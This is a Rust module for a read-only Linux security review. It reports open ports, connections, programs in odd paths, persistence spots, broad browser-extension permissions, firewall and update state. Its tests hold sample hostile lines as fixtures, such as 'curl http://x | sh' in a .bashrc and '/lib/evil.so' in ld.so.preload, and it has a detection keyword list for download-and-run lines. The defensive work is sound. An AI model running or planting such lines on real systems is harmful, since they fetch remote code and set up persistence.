//! Security review: report only, nothing is changed or removed. Parsers take text or paths so tests need no system.
//! Without root some things stay invisible (other users' sockets, `ufw` rules); the UI words it as "nothing visible".
use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
    time::{Duration, SystemTime},
};

use serde_json::Value;

use crate::{
    admin::Admin,
    apps::run as run_c,
    services::{pkexec_output, run},
};

/// `code` picks the sentence in the UI: 0 port open to the network (`n` = pid of the owner), 1 outbound connections of a program,
/// 2 program from an unusual path, 3 `ld.so.preload`, 4 cron job, 5 user systemd unit, 6 `authorized_keys`,
/// 7 recently changed shell rc file, 8 browser extension with broad access, 9 failed logins, 10 firewall,
/// 11 restart needed (`subject` = packages, may be empty), 12 running kernel no longer installed (`subject` = version),
/// 13 updates waiting (`n` = count, `extra` = how many are security updates, empty for none), 14 held packages (`subject`).
/// `level`: 0 information, 1 worth a look, 2 suspicious.
#[derive(Debug, PartialEq)]
pub struct Finding {
    pub code: i32,
    pub level: i32,
    pub subject: String,
    pub extra: String,
    pub n: i32,
}

fn finding(code: i32, level: i32, subject: impl Into<String>, extra: impl Into<String>, n: usize) -> Finding {
    Finding {
        code,
        level,
        subject: subject.into(),
        extra: extra.into(),
        n: n as i32,
    }
}

pub struct Tool {
    pub name: &'static str,
    pub cmd: &'static str,
    pub installed: bool,
}

#[derive(Default)]
pub struct Scan {
    pub findings: Vec<Finding>,
    pub tools: Vec<Tool>,
}

const TOOLS: [(&str, &str); 6] = [
    ("rkhunter", "sudo apt install rkhunter && sudo rkhunter --check"),
    ("chkrootkit", "sudo apt install chkrootkit && sudo chkrootkit"),
    ("lynis", "sudo apt install lynis && sudo lynis audit system"),
    (
        "clamscan",
        "sudo apt install clamav && sudo freshclam && clamscan -ri ~",
    ),
    ("debsums", "sudo apt install debsums && sudo debsums -s"),
    ("aide", "sudo apt install aide && sudo aide --check"),
];

const RC_FILES: [&str; 4] = [".zshrc", ".bashrc", ".profile", ".xprofile"];
const RECENT: Duration = Duration::from_secs(30 * 24 * 3600);

/// Paths the scan reads, so tests can point them at a temp dir.
pub struct Roots {
    pub etc: PathBuf,
    pub home: PathBuf,
}

/// `admin` (one root run, see `admin.rs`) replaces the commands whose output is partial without root.
pub fn scan(admin: Option<&Admin>) -> Scan {
    let roots = Roots {
        etc: "/etc".into(),
        home: std::env::var("HOME").map(PathBuf::from).unwrap_or_default(),
    };
    let mut findings = parse_listening(&admin.map_or_else(|| run("ss", &["-tulnH", "-p"]), |a| a.listen.clone()));
    findings.extend(parse_connections(
        &admin.map_or_else(|| run("ss", &["-tnpH", "state", "established"]), |a| a.conn.clone()),
    ));
    findings.extend(unusual_processes(&roots.home, admin));
    findings.extend(persistence(&roots, &run("crontab", &["-l"])));
    findings.extend(extensions(&roots.home));
    let failed = parse_failed_logins(&admin.map_or_else(
        || {
            run(
                "journalctl",
                &[
                    "--since",
                    "24 hours ago",
                    "-o",
                    "cat",
                    "--no-pager",
                    "-g",
                    "Failed password|authentication failure",
                ],
            )
        },
        |a| a.logins.clone(),
    ));
    if failed > 0 {
        findings.push(finding(9, 1, "", "", failed));
    }
    let conf = fs::read_to_string("/etc/ufw/ufw.conf").unwrap_or_default();
    if let Some(state) = ufw_problem(&conf, run("systemctl", &["is-active", "ufw"]).trim()) {
        findings.push(finding(10, 1, state, "", 0));
    }
    let kernel = run("uname", &["-r"]);
    let kernel = kernel.trim();
    let reboot = Path::new("/var/run/reboot-required");
    findings.extend(reboot_findings(
        reboot
            .exists()
            .then(|| fs::read_to_string("/var/run/reboot-required.pkgs").unwrap_or_default()),
        kernel,
        Path::new("/lib/modules").join(kernel).exists(),
    ));
    findings.extend(update_findings(
        &run_c("apt", &["list", "--upgradable"]),
        &run_c("apt-mark", &["showhold"]),
    ));
    // The firewall goes first among its level: it is one line, and 20 open ports would bury it.
    findings.sort_by_key(|f| (-f.level, f.code != 10, f.code));
    Scan {
        findings,
        tools: TOOLS
            .iter()
            .map(|&(name, cmd)| Tool {
                name,
                cmd,
                installed: ["/usr/bin", "/usr/sbin", "/bin", "/sbin", "/usr/local/bin"]
                    .iter()
                    .any(|d| Path::new(d).join(name).exists()),
            })
            .collect(),
    }
}

/// Why the firewall is off, `None` when it is on. `ufw disable` writes `ENABLED=no` to `ufw.conf` but leaves the
/// systemd service "active", so the service alone misses it. `ufw.conf` is world-readable, unlike the rules.
fn ufw_problem(conf: &str, service: &str) -> Option<String> {
    let enabled = conf.lines().any(|l| l.trim().eq_ignore_ascii_case("ENABLED=yes"));
    if !conf.is_empty() && !enabled {
        Some("disabled".into())
    } else if service != "active" {
        Some(service.into())
    } else {
        None
    }
}

fn is_loopback(addr: &str) -> bool {
    addr.starts_with("127.") || addr.starts_with("[::1]") || addr.starts_with("[::ffff:127.")
}

fn process_name(field: &str) -> &str {
    field
        .split("((\"")
        .nth(1)
        .and_then(|r| r.split('"').next())
        .unwrap_or("")
}

/// `ss -tulnH -p`: sockets that listen on every interface. IPv4 and IPv6 of the same port are one finding.
pub fn parse_listening(text: &str) -> Vec<Finding> {
    let mut seen = BTreeMap::new();
    for l in text.lines() {
        let f: Vec<&str> = l.split_whitespace().collect();
        let Some((host, port)) = f.get(4).and_then(|a| a.rsplit_once(':')) else {
            continue;
        };
        if matches!(host, "0.0.0.0" | "*" | "[::]" | "::") {
            seen.entry((f[0].to_string(), port.to_string()))
                .or_insert_with(|| f.get(6).map_or(("", 0), |p| (process_name(p), process_pid(p))));
        }
    }
    // One finding per program, listing its ports. `n` carries the pid (0 when `ss` could not say), so the app can
    // look up the real executable; every socket `ss` could not attribute lands in one nameless finding.
    // Key: (unnamed last, name, pid); value: (port number, protocol).
    type Ports<'a> = Vec<(u32, &'a str)>;
    let mut by_proc: BTreeMap<(bool, &str, usize), Ports> = BTreeMap::new();
    for ((proto, port), (proc, pid)) in &seen {
        by_proc
            .entry((proc.is_empty(), proc, *pid))
            .or_default()
            .push((port.parse().unwrap_or(0), proto));
    }
    by_proc
        .into_iter()
        .map(|((_, proc, pid), mut ports)| {
            ports.sort();
            let ports: Vec<String> = ports.iter().map(|(port, proto)| format!("{proto} {port}")).collect();
            finding(0, 1, ports.join(", "), proc, pid)
        })
        .collect()
}

/// Name to show for a process. Some programs keep their binary in a folder named after the program and call the file
/// by its version (Claude Code runs as `2.1.314`); then the folder is the name people know.
fn program_name(comm: &str, pid: usize) -> String {
    if !comm.starts_with(|c: char| c.is_ascii_digit()) {
        return comm.to_string();
    }
    name_from_path(comm, &exe_of(pid as i32))
}

fn name_from_path(comm: &str, exe: &str) -> String {
    exe.rsplit('/')
        .find(|c| !c.is_empty() && !c.starts_with(|c: char| c.is_ascii_digit()) && !matches!(*c, "versions" | "bin"))
        .unwrap_or(comm)
        .to_string()
}

fn process_pid(field: &str) -> usize {
    field
        .split("pid=")
        .nth(1)
        .and_then(|r| r.split(|c: char| !c.is_ascii_digit()).next())
        .and_then(|n| n.parse().ok())
        .unwrap_or(0)
}

/// Path of the program behind `pid`; empty when it is gone or belongs to another user (needs root).
pub fn exe_of(pid: i32) -> String {
    fs::read_link(format!("/proc/{pid}/exe")).map_or(String::new(), |p| p.to_string_lossy().into_owned())
}

/// `ss -tnpH state established`, grouped by program. The peer is the field before the `users:` one, which holds
/// whether or not this `ss` prints a State column.
pub fn parse_connections(text: &str) -> Vec<Finding> {
    let mut by_proc: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for l in text.lines() {
        let f: Vec<&str> = l.split_whitespace().collect();
        let Some(at) = f.iter().position(|w| w.starts_with("users:")) else {
            continue;
        };
        if at < 2 || is_loopback(f[at - 1]) {
            continue;
        }
        by_proc
            .entry(program_name(process_name(f[at]), process_pid(f[at])))
            .or_default()
            .push(f[at - 1].to_string());
    }
    by_proc
        .into_iter()
        .map(|(p, peers)| {
            let shown = peers.iter().take(3).cloned().collect::<Vec<_>>().join(", ");
            finding(1, 0, p, shown, peers.len())
        })
        .collect()
}

/// Programs known to run from hidden or temporary folders; without this the list is mostly noise.
const KNOWN_GOOD: [&str; 9] = [
    "/tmp/.mount_", // AppImage
    ".cache/gitstatus",
    ".vscode",
    ".dropbox-dist",
    ".claude",
    ".local/share/claude",
    "gitkraken",
    ".cargo",
    ".rustup",
];

/// 2 for a program running from a temp folder, 1 for a deleted file or a hidden folder under home, else 0.
pub fn exe_level(exe: &str, home: &str) -> i32 {
    if KNOWN_GOOD.iter().any(|k| exe.contains(k)) {
        return 0;
    }
    if ["/tmp/", "/dev/shm/", "/var/tmp/"].iter().any(|p| exe.starts_with(p)) {
        return 2;
    }
    let hidden = exe
        .strip_prefix(home)
        .is_some_and(|r| !home.is_empty() && r.split('/').any(|c| c.starts_with('.') && c.len() > 1));
    // A deleted binary is mostly a package upgraded while the program ran; still worth a restart.
    if exe.ends_with(" (deleted)") || hidden { 1 } else { 0 }
}

fn unusual_processes(home: &Path, admin: Option<&Admin>) -> Vec<Finding> {
    let home = home.to_string_lossy();
    let mut by_exe: BTreeMap<String, (i32, String, usize)> = BTreeMap::new();
    let procs: Vec<(i32, String)> = admin.map_or_else(
        || {
            fs::read_dir("/proc")
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|e| {
                    let pid = e.file_name().to_string_lossy().parse().ok()?;
                    // Other users' processes are unreadable without root; skipped.
                    let exe = fs::read_link(e.path().join("exe")).ok()?;
                    Some((pid, exe.to_string_lossy().into_owned()))
                })
                .collect()
        },
        |a| a.procs.clone(),
    );
    for (pid, exe) in procs {
        let level = exe_level(&exe, &home);
        if level > 0 {
            let comm = fs::read_to_string(format!("/proc/{pid}/comm")).unwrap_or_default();
            by_exe.entry(exe).or_insert((level, comm.trim().to_string(), 0)).2 += 1;
        }
    }
    by_exe
        .into_iter()
        .map(|(exe, (level, comm, n))| finding(2, level, exe, comm, n))
        .collect()
}

fn recent(p: &Path) -> bool {
    fs::metadata(p)
        .and_then(|m| m.modified())
        .ok()
        .and_then(|t| SystemTime::now().duration_since(t).ok())
        .is_some_and(|age| age < RECENT)
}

/// Lines that download or decode something from a shell startup file. `eval "$(tool init)"` is normal and skipped.
pub fn suspicious_rc_lines(text: &str) -> Vec<&str> {
    text.lines()
        .map(str::trim)
        .filter(|l| !l.starts_with('#'))
        .filter(|l| {
            ["curl", "wget", "base64"].iter().any(|k| l.contains(k))
                || (l.contains("eval ") && !l.contains("eval \"$(") && !l.contains("eval $("))
        })
        .collect()
}

fn persistence(r: &Roots, crontab: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let preload = fs::read_to_string(r.etc.join("ld.so.preload")).unwrap_or_default();
    if let Some(l) = preload
        .lines()
        .map(str::trim)
        .find(|l| !l.is_empty() && !l.starts_with('#'))
    {
        out.push(finding(3, 2, l, "", 0));
    }
    for l in crontab
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
    {
        out.push(finding(4, 1, l, "", 0));
    }
    for e in fs::read_dir(r.etc.join("cron.d")).into_iter().flatten().flatten() {
        if recent(&e.path()) {
            out.push(finding(4, 1, e.path().to_string_lossy(), "", 0));
        }
    }
    for e in fs::read_dir(r.home.join(".config/systemd/user"))
        .into_iter()
        .flatten()
        .flatten()
    {
        let name = e.file_name().to_string_lossy().into_owned();
        if name.ends_with(".service") || name.ends_with(".timer") {
            out.push(finding(5, 1, name, "", 0));
        }
    }
    // Only a key count and the age: the keys themselves are never read into a finding.
    let keys = r.home.join(".ssh/authorized_keys");
    let n = fs::read_to_string(&keys)
        .map(|t| {
            t.lines()
                .filter(|l| !l.trim().is_empty() && !l.starts_with('#'))
                .count()
        })
        .unwrap_or(0);
    if n > 0 {
        let extra = if recent(&keys) { "recent" } else { "" };
        out.push(finding(6, 1, keys.to_string_lossy(), extra, n));
    }
    for name in RC_FILES {
        let p = r.home.join(name);
        if !recent(&p) {
            continue;
        }
        let text = fs::read_to_string(&p).unwrap_or_default();
        let bad = suspicious_rc_lines(&text);
        if let Some(first) = bad.first() {
            out.push(finding(
                7,
                1,
                p.to_string_lossy(),
                first.chars().take(100).collect::<String>(),
                bad.len(),
            ));
        }
    }
    out
}

/// Chrome built-in apps (Docs, Slides, Sheets, Drive, Gmail, YouTube...) that sit in the profile but are not add-ons.
const GOOGLE_IDS: [&str; 8] = [
    "aohghmighlieiainnegkcijnilnrhdmn",
    "aapocclcgogkmnckokdopfmhonfmgoek",
    "felcaaldnbdncclmgdcncolpebgiejap",
    "apdfllckaahabafndbhieahigkjlhalf",
    "pjkljhegncpnkpknbcohdijeoejaedia",
    "blpcfgokakmgnkcojhhkbfbldkacnbeo",
    "ghbmnnjooekpmoecnnnilnnbdlolhkhi",
    "nmmhkkegccagdldgiimedpiccmgmieda",
];

/// Permissions that let an add-on read every page or your browsing data.
pub fn broad<'a>(perms: impl Iterator<Item = &'a str>) -> Vec<String> {
    let mut out: Vec<String> = perms
        .filter(|p| {
            matches!(
                *p,
                "<all_urls>"
                    | "*://*/*"
                    | "http://*/*"
                    | "https://*/*"
                    | "webRequest"
                    | "cookies"
                    | "history"
                    | "nativeMessaging"
            )
        })
        .map(String::from)
        .collect();
    out.sort();
    out.dedup();
    out
}

fn strings<'a>(v: &'a Value, key: &str) -> impl Iterator<Item = &'a str> {
    v.get(key)
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
}

/// Chrome `manifest.json`; `messages` is `_locales/<default_locale>/messages.json`, for names like `__MSG_appName__`.
pub fn parse_manifest(manifest: &str, messages: Option<&str>) -> Option<(String, Vec<String>)> {
    let m: Value = serde_json::from_str(manifest).ok()?;
    let mut name = m.get("name")?.as_str()?.to_string();
    if let Some(key) = name.strip_prefix("__MSG_").and_then(|k| k.strip_suffix("__")) {
        let msgs: Value = serde_json::from_str(messages?).ok()?;
        // Chrome message keys are case-insensitive.
        name = msgs
            .as_object()?
            .iter()
            .find(|(k, _)| k.eq_ignore_ascii_case(key))
            .and_then(|(_, v)| v.get("message")?.as_str())?
            .to_string();
    }
    let perms = strings(&m, "permissions").chain(strings(&m, "host_permissions"));
    Some((name, broad(perms)))
}

/// Firefox `extensions.json`: add-ons the user installed, with the permissions they asked for.
pub fn parse_firefox(text: &str) -> Vec<(String, Vec<String>)> {
    let Ok(v) = serde_json::from_str::<Value>(text) else {
        return Vec::new();
    };
    v.get("addons")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
        .filter(|a| a.get("type").and_then(Value::as_str) == Some("extension"))
        .filter(|a| a.get("active").and_then(Value::as_bool) == Some(true))
        .filter(|a| {
            let loc = a.get("location").and_then(Value::as_str).unwrap_or("");
            !loc.starts_with("app-system") && !loc.starts_with("app-builtin")
        })
        .filter_map(|a| {
            let name = a.pointer("/defaultLocale/name")?.as_str()?.to_string();
            let p = a.get("userPermissions")?;
            Some((name, broad(strings(p, "permissions").chain(strings(p, "origins")))))
        })
        .collect()
}

/// Browsers whose add-ons are read: (profile folder under `$HOME`, name, icon theme name). The index is the `n` of a
/// code 8 finding; Firefox is last.
pub const BROWSERS: [(&str, &str, &str); 4] = [
    (".config/google-chrome", "Google Chrome", "google-chrome"),
    (".config/chromium", "Chromium", "chromium"),
    (".config/BraveSoftware/Brave-Browser", "Brave", "brave-browser"),
    (".mozilla/firefox", "Firefox", "firefox"),
];

fn extensions(home: &Path) -> Vec<Finding> {
    let mut found = Vec::new();
    for (bi, (b, _, _)) in BROWSERS[..3].iter().enumerate() {
        for profile in fs::read_dir(home.join(b)).into_iter().flatten().flatten() {
            for ext in fs::read_dir(profile.path().join("Extensions"))
                .into_iter()
                .flatten()
                .flatten()
            {
                if GOOGLE_IDS.contains(&ext.file_name().to_string_lossy().as_ref()) {
                    continue;
                }
                // Several versions can sit side by side; the highest name is the one in use.
                let Some(ver) = fs::read_dir(ext.path())
                    .into_iter()
                    .flatten()
                    .flatten()
                    .map(|v| v.path())
                    .max()
                else {
                    continue;
                };
                let Ok(text) = fs::read_to_string(ver.join("manifest.json")) else {
                    continue;
                };
                let locale = serde_json::from_str::<Value>(&text)
                    .ok()
                    .and_then(|m| m.get("default_locale")?.as_str().map(String::from))
                    .unwrap_or_else(|| "en".into());
                let msgs = fs::read_to_string(ver.join("_locales").join(locale).join("messages.json")).ok();
                found.extend(parse_manifest(&text, msgs.as_deref()).map(|e| (bi, e)));
            }
        }
    }
    for profile in fs::read_dir(home.join(BROWSERS[3].0)).into_iter().flatten().flatten() {
        if let Ok(t) = fs::read_to_string(profile.path().join("extensions.json")) {
            found.extend(parse_firefox(&t).into_iter().map(|e| (3, e)));
        }
    }
    found
        .into_iter()
        .filter(|(_, (_, p))| !p.is_empty())
        .map(|(bi, (name, p))| finding(8, 1, name, p.join(", "), bi))
        .collect()
}

/// `ufw status verbose` through pkexec (asks for the administrator password). Only reads; ufw prints its own error
/// when it is not installed, which is passed on as the error text.
pub fn firewall_rules() -> std::io::Result<String> {
    let out = pkexec_output("/usr/sbin/ufw", &["status", "verbose"])?;
    let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if text.is_empty() {
        return Err(std::io::Error::other(
            String::from_utf8_lossy(&out.stderr).trim().to_string() + " (is ufw installed?)",
        ));
    }
    Ok(text)
}

pub fn parse_failed_logins(text: &str) -> usize {
    text.lines()
        .filter(|l| l.contains("Failed password") || l.contains("authentication failure"))
        .count()
}

/// `pkgs` is the text of `reboot-required.pkgs` when `/var/run/reboot-required` exists, `None` otherwise.
/// A missing `/lib/modules/<running kernel>` means the kernel was replaced while it kept running.
fn reboot_findings(pkgs: Option<String>, kernel: &str, modules_exist: bool) -> Vec<Finding> {
    let mut out = Vec::new();
    if let Some(p) = pkgs {
        let mut names: Vec<&str> = p.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
        names.sort_unstable();
        names.dedup();
        out.push(finding(11, 1, names.join(", "), "", 0));
    }
    if !kernel.is_empty() && !modules_exist {
        out.push(finding(12, 1, kernel, "", 0));
    }
    out
}

/// Waiting updates from `apt list --upgradable` (the local package list, no network) and held packages from
/// `apt-mark showhold`. Security updates are the ones from a `-security` pocket.
fn update_findings(upgradable: &str, holds: &str) -> Vec<Finding> {
    let lines: Vec<&str> = upgradable.lines().filter(|l| l.contains("[upgradable from")).collect();
    let security = lines.iter().filter(|l| l.contains("-security")).count();
    let mut out = Vec::new();
    if !lines.is_empty() {
        let extra = if security > 0 {
            security.to_string()
        } else {
            String::new()
        };
        out.push(finding(13, i32::from(security > 0), "", extra, lines.len()));
    }
    let held: Vec<&str> = holds.lines().map(str::trim).filter(|l| !l.is_empty()).collect();
    if !held.is_empty() {
        out.push(finding(14, 0, held.join(", "), "", held.len()));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn restart_needed_and_replaced_kernel() {
        let f = reboot_findings(Some("linux-base\nlibc6\nlibc6\n".into()), "6.8.0-1", false);
        assert_eq!((f[0].code, f[0].subject.as_str()), (11, "libc6, linux-base"));
        assert_eq!((f[1].code, f[1].subject.as_str()), (12, "6.8.0-1"));
        assert!(reboot_findings(None, "6.8.0-1", true).is_empty());
        assert!(reboot_findings(None, "", false).is_empty());
    }

    #[test]
    fn counts_updates_security_ones_and_holds() {
        let apt = "Listing...\na/noble-updates 1 amd64 [upgradable from: 0]\nb/noble-security,noble-security 2 all [upgradable from: 1]\n";
        let f = update_findings(apt, "linux-image-generic\n");
        assert_eq!((f[0].code, f[0].level, f[0].n, f[0].extra.as_str()), (13, 1, 2, "1"));
        assert_eq!((f[1].code, f[1].subject.as_str()), (14, "linux-image-generic"));
        let none = update_findings("Listing...\n", "");
        assert!(none.is_empty());
        assert_eq!(
            update_findings("a/x-updates 1 all [upgradable from: 0]", "")[0].level,
            0
        );
    }

    #[test]
    fn ufw_off_even_when_its_service_is_active() {
        let off = "# c\nENABLED=no\nLOGLEVEL=low\n";
        assert_eq!(ufw_problem(off, "active").as_deref(), Some("disabled"));
        assert_eq!(ufw_problem("ENABLED=yes\n", "active"), None);
        assert_eq!(ufw_problem("ENABLED=yes\n", "failed").as_deref(), Some("failed"));
        // No ufw.conf: ufw is not installed, so only the service answer is left.
        assert_eq!(ufw_problem("", "inactive").as_deref(), Some("inactive"));
    }

    #[test]
    fn listening_keeps_open_sockets_only_once() {
        let ss = "tcp LISTEN 0 50 0.0.0.0:445 0.0.0.0:* users:((\"smbd\",pid=7,fd=3))\n\
                  tcp LISTEN 0 50 [::]:445 [::]:*\n\
                  tcp LISTEN 0 4096 127.0.0.1:631 0.0.0.0:*\n\
                  udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*\n\
                  udp UNCONN 0 0 *:5353 *:*\n";
        let f = parse_listening(ss);
        assert_eq!(f.len(), 2);
        assert_eq!((f[0].subject.as_str(), f[0].extra.as_str()), ("tcp 445", "smbd"));
        assert_eq!(f[0].n, 7);
        assert_eq!(f[1].subject, "udp 5353");
    }

    #[test]
    fn version_named_binary_takes_its_folder_name() {
        let exe = "/home/u/.local/share/claude/versions/2.1.314";
        assert_eq!(name_from_path("2.1.314", exe), "claude");
        assert_eq!(name_from_path("2.1.314", ""), "2.1.314");
        assert_eq!(program_name("firefox", 1), "firefox");
    }

    #[test]
    fn listening_groups_ports_by_program() {
        let ss = "tcp LISTEN 0 1 0.0.0.0:22000 0.0.0.0:* users:((\"syncthing\",pid=9,fd=3))\n\
                  udp UNCONN 0 0 0.0.0.0:21027 0.0.0.0:* users:((\"syncthing\",pid=9,fd=4))\n\
                  tcp LISTEN 0 1 0.0.0.0:139 0.0.0.0:*\n\
                  tcp LISTEN 0 1 0.0.0.0:445 0.0.0.0:*\n";
        let f = parse_listening(ss);
        assert_eq!(f.len(), 2);
        assert_eq!(f[0].subject, "udp 21027, tcp 22000");
        assert_eq!((f[1].subject.as_str(), f[1].extra.as_str()), ("tcp 139, tcp 445", ""));
    }

    #[test]
    fn connections_group_by_program_and_skip_loopback() {
        let ss = "0 0 10.0.0.2:5000 1.2.3.4:443 users:((\"firefox\",pid=1,fd=9))\n\
                  ESTAB 0 0 10.0.0.2:5001 5.6.7.8:443 users:((\"firefox\",pid=1,fd=10))\n\
                  0 0 127.0.0.1:1 127.0.0.1:2 users:((\"x\",pid=2,fd=1))\n";
        let f = parse_connections(ss);
        assert_eq!(f.len(), 1);
        assert_eq!((f[0].subject.as_str(), f[0].n), ("firefox", 2));
    }

    #[test]
    fn exe_paths() {
        assert_eq!(exe_level("/tmp/x/evil", "/home/u"), 2);
        assert_eq!(exe_level("/tmp/.mount_abc/app", "/home/u"), 0);
        assert_eq!(exe_level("/usr/bin/foo (deleted)", "/home/u"), 1);
        assert_eq!(exe_level("/home/u/.hidden/bin", "/home/u"), 1);
        assert_eq!(exe_level("/home/u/.vscode/server/node", "/home/u"), 0);
        assert_eq!(exe_level("/home/u/bin/tool", "/home/u"), 0);
        assert_eq!(exe_level("/home/u/.x", ""), 0);
    }

    #[test]
    fn rc_lines() {
        let t = "# curl comment\neval \"$(starship init zsh)\"\ncurl http://x | sh\neval $payload\n";
        assert_eq!(suspicious_rc_lines(t), vec!["curl http://x | sh", "eval $payload"]);
    }

    #[test]
    fn manifest_resolves_locale_names_and_flags_broad_access() {
        let m = r#"{"name":"__MSG_appName__","permissions":["storage","cookies"],"host_permissions":["<all_urls>"]}"#;
        let msgs = r#"{"appname":{"message":"Grammar Thing"}}"#;
        let (name, p) = parse_manifest(m, Some(msgs)).unwrap();
        assert_eq!(name, "Grammar Thing");
        assert_eq!(p, vec!["<all_urls>", "cookies"]);
        assert!(parse_manifest(m, None).is_none());
    }

    #[test]
    fn firefox_skips_builtin_and_inactive() {
        let t = r#"{"addons":[
            {"type":"extension","active":true,"location":"app-profile","defaultLocale":{"name":"uBlock"},"userPermissions":{"permissions":["webRequest"],"origins":["<all_urls>"]}},
            {"type":"extension","active":true,"location":"app-system-defaults","defaultLocale":{"name":"Builtin"},"userPermissions":{"permissions":["cookies"],"origins":[]}},
            {"type":"extension","active":false,"location":"app-profile","defaultLocale":{"name":"Off"},"userPermissions":{"permissions":["cookies"],"origins":[]}}]}"#;
        assert_eq!(
            parse_firefox(t),
            vec![(
                "uBlock".to_string(),
                vec!["<all_urls>".to_string(), "webRequest".to_string()]
            )]
        );
    }

    #[test]
    fn persistence_reads_temp_dirs() {
        let dir = std::env::temp_dir().join(format!("fc-sec-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        let (etc, home) = (dir.join("etc"), dir.join("home"));
        fs::create_dir_all(home.join(".ssh")).unwrap();
        fs::create_dir_all(&etc).unwrap();
        fs::write(etc.join("ld.so.preload"), "/lib/evil.so\n").unwrap();
        fs::write(
            home.join(".ssh/authorized_keys"),
            "ssh-ed25519 AAAA secret-key-material\n",
        )
        .unwrap();
        fs::write(home.join(".bashrc"), "curl http://x | sh\n").unwrap();
        let f = persistence(&Roots { etc, home }, "# m\n* * * * * /tmp/x\n");
        let codes: Vec<i32> = f.iter().map(|f| f.code).collect();
        assert_eq!(codes, vec![3, 4, 6, 7]);
        assert!(
            f.iter()
                .all(|f| !f.subject.contains("secret") && !f.extra.contains("secret"))
        );
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn failed_logins_count() {
        assert_eq!(
            parse_failed_logins("Failed password for root\nok\nauthentication failure; x\n"),
            2
        );
    }
}
